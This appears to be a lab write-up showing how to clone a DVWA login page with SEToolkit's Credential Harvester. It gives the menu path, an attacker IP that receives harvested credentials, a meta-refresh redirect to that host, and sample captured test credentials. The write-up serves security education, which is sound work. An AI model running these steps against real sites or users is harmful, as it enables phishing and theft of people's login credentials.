# 
🌐 Website Cloning Using SEToolkit (Credential Harvester)

## 📌 Project Overview
This lab demonstrates a website cloning attack using **SEToolkit** to simulate a credential harvesting scenario in a controlled lab environment.

The goal is to understand how attackers clone legitimate websites to capture user credentials and why defensive awareness is critical.

---

## 🛠️ Tools Used
- SEToolkit
- Kali Linux
- DVWA (target website)
- Apache Web Server

---

## ⚠️ Lab Disclaimer
This activity was conducted **strictly in a controlled lab environment** for educational purposes only.  
No real users or live systems were targeted.

---

## 🔎 Commands, Steps & Explanations

### 1️⃣ Gain Root Privileges
sudo su  

SEToolkit requires root privileges to configure services, clone websites, and capture credentials.

---

### 2️⃣ Launch SEToolkit
setoolkit  

This starts the Social Engineering Toolkit interactive menu.

---

### 3️⃣ Navigate SEToolkit Menus
1 → Social-Engineering Attacks  
2 → Website Attack Vectors  
3 → Credential Harvester Attack Method  
2 → Site Cloner  

These options configure SEToolkit to:
- Perform a social engineering attack
- Use a website-based attack vector
- Harvest credentials
- Clone a target website

---

### 4️⃣ Enter Attacker IP Address
10.6.6.1  

This IP address hosts the cloned website and receives harvested credentials.

---

### 5️⃣ Enter Target Website URL
http://dvwa.vm  

The DVWA website is cloned to appear identical to the legitimate site.

---

### 6️⃣ Redirect Page Configuration
```html
<html>
<head>
<meta http-equiv="refresh" content="0; url=http://10.6.6.1/" />
</head>
</html>

---

### Captured Credentials
Email address- cyber@gmail.com
Password- 1234

These credentials demonstrate successful credential harvesting during the simulation.

---

### Exit SEToolkit

99
99
99
99
